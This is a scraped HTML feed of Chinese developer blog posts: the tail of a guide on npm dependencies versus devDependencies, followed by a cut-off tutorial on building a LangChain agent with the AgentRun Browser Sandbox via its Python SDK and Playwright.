  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-project"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.0"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// 运行时必需</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.3.0"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// HTTP 请求库</span>
    <span class="hljs-attr">"vue-router"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.1.0"</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 路由管理</span>
    <span class="hljs-attr">"pinia"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.0"</span>         <span class="hljs-comment">// 状态管理</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span><span class="hljs-punctuation">,</span>         <span class="hljs-comment">// 构建工具</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.0.0"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// 代码检查</span>
    <span class="hljs-attr">"jest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^29.0.0"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 测试框架</span>
    <span class="hljs-attr">"prettier"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.0"</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// 代码格式化</span>
    <span class="hljs-attr">"@types/node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.0.0"</span>  <span class="hljs-comment">// TypeScript 类型定义</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-14">不同环境的安装策略</h3>
<p><strong>开发环境安装所有依赖：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装所有依赖（包括 devDependencies）</span>
npm install
<span class="hljs-comment"># 或</span>
yarn install
</code></pre>
<p><strong>生产环境仅安装 dependencies：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 跳过 devDependencies</span>
npm install --production
<span class="hljs-comment"># 或设置环境变量</span>
<span class="hljs-attr">NODE_ENV</span>=production npm install
​
<span class="hljs-comment"># Dockerfile 中的典型用法</span>
COPY package*.json ./
RUN npm ci <span class="hljs-attr">--only</span>=production
</code></pre>
<p><strong>CI/CD 流水线优化：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions 示例</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span>              <span class="hljs-comment"># 安装所有依赖用于测试</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">test</span>
<span class="hljs-string">​</span>
  <span class="hljs-attr">deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span> <span class="hljs-string">--production</span> <span class="hljs-comment"># 仅安装生产依赖</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span>
</code></pre>
<h2 data-id="heading-15">⚠️ 常见误区与最佳实践</h2>
<h3 data-id="heading-16">误区 1：随意放置依赖</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// ❌ 错误：将构建工具放在 dependencies</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"webpack"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span>  <span class="hljs-comment">// 错误！这应该是 devDependency</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
​
<span class="hljs-comment">// ✅ 正确</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"webpack"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-17">误区 2：类型定义包放置错误</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// 对于 TypeScript 项目：</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.18.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@types/express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.17.0"</span>  <span class="hljs-comment">// 类型定义永远是 devDependency</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-18">最佳实践</h3>
<ol>
<li>
<p><strong>严格区分</strong>：运行时必需的放 <code>dependencies</code>，开发工具放 <code>devDependencies</code></p>
</li>
<li>
<p><strong>定期审计</strong>：使用 <code>npm audit</code> 检查安全漏洞</p>
</li>
<li>
<p><strong>版本控制</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.0"</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 兼容性更新</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"~1.3.0"</span>  <span class="hljs-comment">// 小版本更新</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
<li>
<p><strong>依赖清理</strong>：定期删除未使用的依赖</p>
<pre><code class="hljs language-go" lang="go">npm uninstall &lt;unused-<span class="hljs-keyword">package</span>&gt;
</code></pre>
</li>
</ol>
<h2 data-id="heading-19">🔬 高级技巧</h2>
<h3 data-id="heading-20">查看依赖树</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 查看 dependencies 依赖树</span>
npm list <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span>
​
<span class="hljs-comment"># 仅查看 devDependencies</span>
npm list --dev <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span>
​
<span class="hljs-comment"># 图形化显示</span>
npm list <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span> --json | npx dependency-tree
</code></pre>
<h3 data-id="heading-21">依赖分析工具</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 分析包大小</span>
npx source-<span class="hljs-keyword">map</span>-explorer dist/*.js
​
<span class="hljs-comment"># 查看重复依赖</span>
npx depcheck
​
<span class="hljs-comment"># 可视化依赖</span>
npx npm-gui
</code></pre>
<h3 data-id="heading-22">package-lock.json 与 yarn.lock</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 确保依赖一致性</span>
npm ci  <span class="hljs-comment"># 使用 package-lock.json 精确安装</span>
yarn install --frozen-lockfile
</code></pre>
<h2 data-id="heading-23">📊 实际案例分析</h2>
<h3 data-id="heading-24">案例 1：前后端分离项目</h3>
<pre><code class="hljs language-perl" lang="perl">// frontend/package.json
{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"react"</span>: <span class="hljs-string">"^18.2.0"</span>,
    <span class="hljs-string">"react-dom"</span>: <span class="hljs-string">"^18.2.0"</span>,
    <span class="hljs-string">"antd"</span>: <span class="hljs-string">"^5.0.0"</span>,
    <span class="hljs-string">"react-router-dom"</span>: <span class="hljs-string">"^6.8.0"</span>
  },
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"@vitejs/plugin-react"</span>: <span class="hljs-string">"^3.0.0"</span>,
    <span class="hljs-string">"typescript"</span>: <span class="hljs-string">"^5.0.0"</span>,
    <span class="hljs-string">"@types/react"</span>: <span class="hljs-string">"^18.0.0"</span>,
    <span class="hljs-string">"jest"</span>: <span class="hljs-string">"^29.0.0"</span>
  }
}
​
// backend/package.json  
{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"express"</span>: <span class="hljs-string">"^4.18.0"</span>,
    <span class="hljs-string">"mongoose"</span>: <span class="hljs-string">"^7.0.0"</span>,
    <span class="hljs-string">"jsonwebtoken"</span>: <span class="hljs-string">"^9.0.0"</span>
  },
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"nodemon"</span>: <span class="hljs-string">"^2.0.0"</span>,
    <span class="hljs-string">"@types/express"</span>: <span class="hljs-string">"^4.17.0"</span>,
    <span class="hljs-string">"jest"</span>: <span class="hljs-string">"^29.0.0"</span>
  }
}
</code></pre>
<h3 data-id="heading-25">案例 2：Monorepo 项目</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json (根目录)</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"packages/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lerna"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"jest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^29.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
​
<span class="hljs-comment">// packages/web-app/package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"shared-utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"*"</span>  <span class="hljs-comment">// 工作区内引用</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-26"> 总结要点</h2>
<ol>
<li>
<p><strong>核心区别</strong>：<code>dependencies</code> 用于生产运行，<code>devDependencies</code> 用于开发构建</p>
</li>
<li>
<p><strong>部署策略</strong>：生产环境跳过 <code>devDependencies</code> 安装以优化部署</p>
</li>
<li>
<p><strong>性能影响</strong>：正确分类可以减少生产包体积，加快安装速度</p>
</li>
<li>
<p><strong>团队协作</strong>：明确的依赖分类有助于团队理解和维护项目</p>
</li>
<li>
<p><strong>安全性</strong>：定期审计和更新依赖，特别是生产依赖</p>
</li>
</ol>
<p>记住一个简单的原则：<strong>如果用户运行你的应用时需要这个包，它就是 dependency；如果只有开发者在编写、测试、构建时需要，它就是 devDependency。</strong> 正确使用这两个字段，能让你的项目更加专业、高效和可维护。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[快速上手：LangChain + AgentRun 浏览器沙箱极简集成指南]]></title>    <link>https://juejin.cn/post/7592710766010597386</link>    <guid>https://juejin.cn/post/7592710766010597386</guid>    <pubDate>2026-01-08T09:40:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592710766010597386" data-draft-id="7592765004807929907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="快速上手：LangChain + AgentRun 浏览器沙箱极简集成指南"/> <meta itemprop="keywords" content="Serverless"/> <meta itemprop="datePublished" content="2026-01-08T09:40:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Serverless社区"/> <meta itemprop="url" content="https://juejin.cn/user/1794004139382301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            快速上手：LangChain + AgentRun 浏览器沙箱极简集成指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1794004139382301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Serverless社区
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:40:18.000Z" title="Thu Jan 08 2026 09:40:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在 Agentic AI 时代,智能体需要与真实世界交互,而浏览器是连接虚拟世界与现实世界的重要桥梁。AgentRun Browser Sandbox 为智能体提供了安全、高性能、免运维的浏览器执行环境,让 AI Agent 真正具备"上网"的能力——从网页抓取、信息提取到表单填写、自动化操作,一切皆可实现。</p>
<h2 data-id="heading-1">AgentRun Browser Sandbox 介绍</h2>
<h3 data-id="heading-2">什么是 Browser Sandbox?</h3>
<p>Browser Sandbox 是 AgentRun 平台提供的云原生无头浏览器沙箱服务,基于阿里云函数计算（FC）构建。它为智能体提供了一个安全隔离的浏览器执行环境,支持通过标准的 Chrome DevTools Protocol (CDP) 远程控制浏览器实例。</p>
<h3 data-id="heading-3">核心特性</h3>
<p><strong>无头浏览器能力</strong></p>
<ul>
<li>内置 Chromium/Chrome 浏览器,支持完整的 Web 标准</li>
<li>原生兼容 Puppeteer、Playwright 等主流自动化框架</li>
<li>支持通过 CDP 协议进行精细化控制</li>
</ul>
<p><strong>实时可视化</strong></p>
<ul>
<li>内置 VNC 服务,支持实时查看浏览器界面</li>
<li>提供操作录制功能,方便调试和回放</li>
<li>支持通过 noVNC 客户端在网页中直接观看</li>
</ul>
<p><strong>安全与隔离</strong></p>
<ul>
<li>每个沙箱实例运行在独立的容器环境中</li>
<li>文件系统和进程空间完全隔离</li>
<li>支持 WSS 加密传输,确保数据安全</li>
</ul>
<p><strong>Serverless 架构</strong></p>
<ul>
<li>按需创建,按量付费,无需提前预置资源</li>
<li>快速弹性伸缩,支持高并发场景</li>
<li>零运维,无需管理服务器和浏览器依赖</li>
</ul>
<h3 data-id="heading-4">主要应用场景</h3>
<ul>
<li><strong>AI Agent 赋能</strong>: 为大模型提供"眼睛"和"手",执行网页浏览、信息提取、在线操作等任务</li>
<li><strong>自动化测试</strong>: 在云端运行端到端（E2E）测试和视觉回归测试</li>
<li><strong>数据采集</strong>: 稳定、高效地进行网页抓取,应对动态加载和反爬虫挑战</li>
<li><strong>内容生成</strong>: 自动化生成网页截图或 PDF 文档</li>
</ul>
<h2 data-id="heading-5">上手使用 Agentrun Browser Sandbox</h2>
<h3 data-id="heading-6">AgentRun SDK 快速介绍</h3>
<blockquote>
<p>后续的内容将基于 Agentrun SDK 进行，因此我们先对 SDK 进行简要介绍</p>
</blockquote>
<p>AgentRun SDK 是一个开源的 Python 工具包,旨在简化智能体与 AgentRun 平台各种服务（包括 Browser Sandbox）的集成。它提供了统一的接口,让您可以用几行代码就将沙箱能力集成到现有的 Agent 框架中。SDK 的核心功能如下：</p>
<p><strong>统一集成接口</strong></p>
<ul>
<li>提供对 LangChain、AgentScope 等主流框架的开箱即用支持</li>
<li>统一的模型代理接口,简化多模型管理</li>
<li>标准化的工具注册机制</li>
</ul>
<p><strong>Sandbox 生命周期管理</strong></p>
<ul>
<li>自动创建和销毁沙箱实例</li>
<li>支持会话级别的状态保持</li>
<li>灵活的资源配置和超时控制</li>
</ul>
<h4 data-id="heading-7">安装 AgentRun SDK</h4>
<pre><code class="hljs language-bash" lang="bash">pip install agentrun-sdk[playwright,server]
</code></pre>
<blockquote>
<p><strong>注意</strong>: 确保您的 Python 环境版本在 3.10 及以上。</p>
</blockquote>
<h4 data-id="heading-8">基本使用示例</h4>
<p>以下是使用 AgentRun SDK 创建和管理 Browser Sandbox 的核心代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> agentrun.sandbox <span class="hljs-keyword">import</span> Sandbox, TemplateType
<span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright

<span class="hljs-comment"># 创建 Browser Sandbox</span>
sandbox = Sandbox.create(
    template_type=TemplateType.BROWSER,
    template_name=<span class="hljs-string">"your-template-name"</span>,
    sandbox_idle_timeout_seconds=<span class="hljs-number">300</span>
)

<span class="hljs-comment"># 获取 CDP URL（用于 Playwright 连接）</span>
cdp_url = sandbox.get_cdp_url()

<span class="hljs-comment"># 使用 Playwright 连接并操作</span>
<span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:
    browser = p.chromium.connect_over_cdp(cdp_url)
    page = browser.contexts[<span class="hljs-number">0</span>].pages[<span class="hljs-number">0</span>]
    
    page.goto(<span class="hljs-string">"https://www.example.com"</span>)
    page.screenshot(path=<span class="hljs-string">"screenshot.png"</span>)
    
    browser.close()

<span class="hljs-comment"># 销毁 Sandbox</span>
sandbox.delete()
</code></pre>
<p><strong>关键概念：</strong></p>
<ul>
<li><strong>template_name</strong>: 控制台创建的浏览器环境模板</li>
<li><strong>cdp_url</strong>: 用于 Playwright/Puppeteer 连接</li>
<li><strong>vnc_url</strong>: 用于实时查看浏览器画面（可通过 <code>sandbox.get_cdp_url()</code> 获取）</li>
</ul>
<blockquote>
<p><strong>注意</strong>: 由于所有浏览器操作都在云端进行，您无需在本地安装浏览器。Playwright 仅用于通过 CDP 协议连接到云端的浏览器实例。</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">如何创建 sandbox 模板</h3>
<p>使用 Browser Sandbox 需要新建 Sandbox 模板，您需要访问  <a href="https://link.juejin.cn?target=https%3A%2F%2Ffunctionai.console.aliyun.com%2Fcn-hangzhou%2Fagent%2Fruntime%2Fsandbox" target="_blank" title="https://functionai.console.aliyun.com/cn-hangzhou/agent/runtime/sandbox" ref="nofollow noopener noreferrer">Agentrun 控制台网站</a>，并按照如下步骤创建模板:</p>
<ol>
<li>在顶部菜单栏选择“运行时与沙箱”；</li>
<li>在左侧边栏选择“Sandbox沙箱”；</li>
<li>点击右上角“创建沙箱模板”；</li>
</ol>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974429440-0c1449b8-6b97-42a0-b7c1-ce0b7a9a6dfd.png" alt="" loading="lazy"/></p>
<ol start="4">
<li>选择“浏览器”；
<img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974441761-64413df3-58a5-4404-b1dc-56d294d739eb.png" alt="" loading="lazy"/></li>
<li>在弹出的抽屉对话框中填写和选择您的模板的规格、网络等配置，并复制模板名称；</li>
</ol>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974447184-8384c578-4705-4757-9d82-7b785d8038fb.png" alt="" loading="lazy"/>
6. 点击“创建浏览器” 等待其就绪即可。</p>
<h3 data-id="heading-10">从零开始用 LangChain 创建 Browser Sandbox 智能体</h3>
<p>本教程将指导您从零开始创建一个完整的 Browser Sandbox 智能体项目。</p>
<h4 data-id="heading-11">基于 LangChain 集成 Browser Sandbox</h4>
<p>本教程将详细讲解如何使用 LangChain 创建 Browser Sandbox 相关的 tools 并集成到 Agent 中。</p>
<h5 data-id="heading-12">项目结构</h5>
<p>为了保持代码的内聚性和可维护性，我们将代码拆分为以下模块：</p>
<p><strong>模块职责划分：</strong></p>
<ul>
<li>sandbox_manager.py: 负责 Sandbox 的创建、管理和销毁，提供统一的接口</li>
<li>langchain_agent.py: 负责创建 LangChain tools 和 Agent，集成 VNC 信息</li>
<li>main.py: 作为入口文件，演示如何使用上述模块</li>
</ul>
<h5 data-id="heading-13">步骤 1: 创建项目并安装依赖</h5>
<p>首先创建项目目录（如果还没有）：</p>
<pre><code class="hljs language-typescript" lang="typescript">mkdir -p langchain-demo
cd langchain-demo
</code></pre>
<p>创建 requirements.txt 文件，内容如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"># <span class="hljs-title class_">LangChain</span> 核心库
langchain&gt;=<span class="hljs-number">0.1</span><span class="hljs-number">.0</span>
langchain-openai&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.5</span>
langchain-community&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.20</span>

# <span class="hljs-title class_">AgentRun</span> <span class="hljs-variable constant_">SDK</span>
agentrun-sdk[playwright,server]&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.8</span>

# 浏览器自动化
playwright&gt;=<span class="hljs-number">1.40</span><span class="hljs-number">.0</span>

# 环境变量管理
python-dotenv&gt;=<span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
</code></pre>
<p>然后安装依赖：</p>
<pre><code class="hljs language-typescript" lang="typescript">pip install -r requirements.<span class="hljs-property">txt</span>
</code></pre>
<p>主要依赖说明：</p>
<ul>
<li>langchain 和 langchain-openai: LangChain 核心库</li>
<li>agentrun-sdk[playwright,server]: AgentRun SDK，用于 Sandbox 管理</li>
<li>playwright: 浏览器自动化库 python-dotenv: 环境变量管理</li>
</ul>
<h5 data-id="heading-14">步骤 2: 配置环境变量</h5>
<p>在项目根目录创建 .env 文件，配置以下环境变量：</p>
<pre><code class="hljs language-typescript" lang="typescript"># 阿里云百炼平台的 <span class="hljs-variable constant_">API</span> <span class="hljs-title class_">Key</span>，用于调用大模型能力
# 请前往 <span class="hljs-attr">https</span>:<span class="hljs-comment">//bailian.console.aliyun.com/?tab=app#/api-key 创建和查看</span>
<span class="hljs-variable constant_">DASHSCOPE_API_KEY</span>=sk-your-bailian-api-key

